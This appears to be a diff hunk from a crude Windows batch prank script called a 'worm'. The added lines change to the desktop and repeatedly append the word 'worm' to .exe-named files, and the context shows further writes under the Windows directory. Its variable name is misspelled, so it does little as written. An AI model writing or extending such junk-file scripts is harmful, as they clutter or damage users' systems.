@@ -16,6 +16,17 @@ echo worm >> %ramdom%.exe
 echo worm >> %ramdom%.exe 
 echo worm >> %ramdom%.exe 
 echo worm >> %ramdom%.exe 
+cd desktop 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
+echo worm >> %ramdom%.exe 
 cd 
 cd windows 
 mkdir %ramdom% 
